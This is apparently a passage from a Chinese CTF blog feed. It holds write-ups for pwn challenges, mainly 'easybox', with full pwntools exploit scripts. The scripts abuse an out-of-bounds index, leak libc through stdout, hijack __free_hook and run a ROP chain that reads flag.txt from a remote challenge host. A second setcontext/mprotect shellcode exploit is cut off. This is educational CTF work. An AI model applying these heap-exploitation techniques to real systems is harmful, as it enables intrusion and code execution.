0x10 大小</span>\n    \n    <span class=\"token comment\"># dbg()</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span> <span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span>\n    \n    <span class=\"token comment\"># p.success(getShell())</span>\n    p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nattack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   sftpwn-wp.py\n@Time    :   2022/01/26 16:20:33\n@Author  :   Niyah \n'''</span></code></pre>\n",
            "tags": [
                "CTF",
                "PWN",
                "格式化字符串"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/easybox-wp/",
            "url": "http://niyah.cn/CTF/easybox-wp/",
            "title": "easybox-wp",
            "date_published": "2022-01-24T14:10:27.000Z",
            "content_html": "<p>看别人 wp 发现的一种 Orw 方法</p>\n<a id=\"more\"></a>\n<h1 id=\"easybox-wp\"><a class=\"markdownIt-Anchor\" href=\"#easybox-wp\">#</a> easybox-wp</h1>\n<p>首先观察题目</p>\n<p>禁用了 execve 调用</p>\n<p><img src=\"/CTF/easybox-wp/image-20220117213140717.png\" alt=\"image-20220117213140717\"></p>\n<p>进入函数观察可以发现有个数组越界</p>\n<p><img src=\"/CTF/easybox-wp/image-20220117213103827.png\" alt=\"image-20220117213103827\"></p>\n<p><img src=\"/CTF/easybox-wp/image-20220117213309490.png\" alt=\"image-20220117213309490\"></p>\n<p>那么我们在申请 index 为 16 的堆块时就会直接将堆块地址写到储存 size 的数组中形成一个很大的 size，再修改 index 为 0 的堆块时便可以写很多数据</p>\n<p><img src=\"/CTF/easybox-wp/image-20220117213937060.png\" alt=\"image-20220117213937060\"></p>\n<p>本题没有 show，可以爆破申请到 stdout 泄露出 libc 地址，之后申请到__free_hook 完成 orw 操作</p>\n<p>orw 参考链接：<a href=\"https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458392560&amp;idx=1&amp;sn=73533c60d701ad5816545520bc889135&amp;chksm=b18f277a86f8ae6ce880fd532b70bbbb70180859299f7476bd1d3033a43ea7e0b3fb6709c460&amp;mpshare=1&amp;scene=23&amp;srcid=0916yGLvaaM3pZ9PY81C5D8W&amp;sharer_sharetime=1631793106745&amp;sharer_shareid=a934676a75a04c6ea85c1e3e4f6123af#rd\">高 Glibc 版本下的堆骚操作解析</a></p>\n<h2 id=\"exp1\"><a class=\"markdownIt-Anchor\" href=\"#exp1\">#</a> exp1</h2>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./easybox'</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'121.40.89.206'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'41232'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu64<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu32<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': \\033[1;36m 0x%x \\033[0m'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">ras</span><span class=\"token punctuation\">(</span> data <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'leak'</span> <span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> data\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">boom</span><span class=\"token punctuation\">(</span> pwn <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    context<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span> os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>timeout <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">global</span> p\n    i <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token keyword\">while</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            i<span class=\"token operator\">+=</span><span class=\"token number\">1</span>\n            pwn<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n            lg<span class=\"token punctuation\">(</span><span class=\"token string\">'times ======== > '</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span>\n            p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>DEBUG<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">else</span> <span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'ch:'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>idx <span class=\"token punctuation\">,</span>size <span class=\"token punctuation\">,</span> text <span class=\"token operator\">=</span> <span class=\"token string\">\"a\"</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'index?'</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'size??'</span> <span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'something'</span> <span class=\"token punctuation\">,</span> text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'index?'</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>idx <span class=\"token punctuation\">,</span> text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'index?'</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'something'</span> <span class=\"token punctuation\">,</span> text<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># one_gad = one_gadget(libc.path)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    \n    <span class=\"token comment\"># $rebase(0x000000000004060)</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        add<span class=\"token punctuation\">(</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span><span class=\"token punctuation\">)</span>\n\n    edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x501</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">11</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">12</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#2</span>\n\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">13</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x1f8</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">14</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x1f8</span><span class=\"token punctuation\">)</span>\n    edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x81</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x78</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x481</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">15</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x248</span> <span class=\"token punctuation\">,</span> p16<span class=\"token punctuation\">(</span><span class=\"token number\">0x36a0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span><span class=\"token punctuation\">)</span>\n    \n    io_file <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n        <span class=\"token number\">0xfbad1800</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\x00'</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span> <span class=\"token punctuation\">,</span> io_file<span class=\"token punctuation\">)</span>\n    leak <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>leak <span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    _IO_2_1_stdin_ <span class=\"token operator\">=</span> leak\n    libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> leak <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdin_'</span><span class=\"token punctuation\">]</span>\n    __free_hook <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">,</span>__free_hook<span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">11</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x228</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n\n    edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x81</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x78</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x81</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x78</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x81</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x78</span> <span class=\"token punctuation\">,</span><span class=\"token number\">0x81</span><span class=\"token punctuation\">,</span> __free_hook<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">5</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># add(4 , 0x78)</span>\n\n    __free_hook <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span>\n    magic <span class=\"token operator\">=</span> <span class=\"token number\">0x157d8a</span> <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>address\n    \n    read_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span>\n    open_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'open'</span><span class=\"token punctuation\">]</span>\n    puts_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span>\n    leave_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'leave;ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_rax_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rax; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_rdi_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rdi; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_rsi_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rsi; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_r13_pop_r15_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop r13 ; pop r15 ; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_rdx_pop_rbx_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rdx ; pop rbx ; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    ret <span class=\"token operator\">=</span> pop_rdi_ret <span class=\"token operator\">+</span> <span class=\"token number\">1</span>\n    \n    magic_chain  <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n        __free_hook <span class=\"token operator\">+</span> <span class=\"token number\">0x8</span><span class=\"token punctuation\">,</span> pop_r13_pop_r15_ret <span class=\"token punctuation\">,</span> \n        __free_hook <span class=\"token operator\">+</span> <span class=\"token number\">0x8</span><span class=\"token punctuation\">,</span> __free_hook <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span>\n        pop_rdx_pop_rbx_ret<span class=\"token punctuation\">,</span> <span class=\"token number\">0x300</span> <span class=\"token punctuation\">,</span>\n        leave_ret<span class=\"token punctuation\">,</span> pop_rsi_ret<span class=\"token punctuation\">,</span>\n        __free_hook <span class=\"token operator\">+</span> <span class=\"token number\">0x8</span> <span class=\"token punctuation\">,</span> pop_rdi_ret <span class=\"token punctuation\">,</span> \n        <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> read_addr \n    <span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># len magic_chain 0x60</span>\n    flag_addr <span class=\"token operator\">=</span> __free_hook <span class=\"token operator\">+</span> <span class=\"token number\">0x100</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>magic_chain<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span>\n    chain <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n        pop_rdi_ret <span class=\"token punctuation\">,</span> flag_addr <span class=\"token punctuation\">,</span> pop_rsi_ret <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> open_addr<span class=\"token punctuation\">,</span>\n        pop_rdi_ret <span class=\"token punctuation\">,</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">,</span> pop_rsi_ret <span class=\"token punctuation\">,</span> flag_addr <span class=\"token punctuation\">,</span> pop_rdx_pop_rbx_ret <span class=\"token punctuation\">,</span> <span class=\"token number\">0x100</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> read_addr<span class=\"token punctuation\">,</span>\n        pop_rdi_ret <span class=\"token punctuation\">,</span> flag_addr <span class=\"token punctuation\">,</span> puts_addr\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'flag.txt\\x00'</span>\n    <span class=\"token comment\"># len chain 0x80</span>\n    \n    payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span> magic <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> magic_chain\n    \n    getflag <span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">0xc</span> <span class=\"token operator\">+</span> chain\n\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'magic'</span> <span class=\"token punctuation\">,</span> magic<span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">12</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span> <span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># dbg('free')</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\"># raw_input()</span>\n    se<span class=\"token punctuation\">(</span>getflag<span class=\"token punctuation\">)</span>\n\n    p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nboom<span class=\"token punctuation\">(</span>attack<span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   easybox.py\n@Time    :   2022/01/17 19:22:01\n@Author  :   Niyah \n'''</span></code></pre>\n<h2 id=\"exp2\"><a class=\"markdownIt-Anchor\" href=\"#exp2\">#</a> exp2</h2>\n<p>首先使用以下 gadget 将 rdi 转化为 rdx</p>\n<blockquote>\n<p>mov rdx,QWORD PTR [rdi+0x8]<br>\nmov QWORD PTR [rsp],rax<br>\ncall QWORD PTR [rdx+0x20]</p>\n</blockquote>\n<p>之后调用 setcontext 设置寄存器执行栈迁移迁移到 __free_hook 附近并设置 rip 去执行 mprotect 将 __free_hook 附近设置为可执行</p>\n<p>最后 ret2shellcode 执行提前布置到 __free_hook 附近的 shellcode</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./easybox'</span>\ncontext<span class=\"token 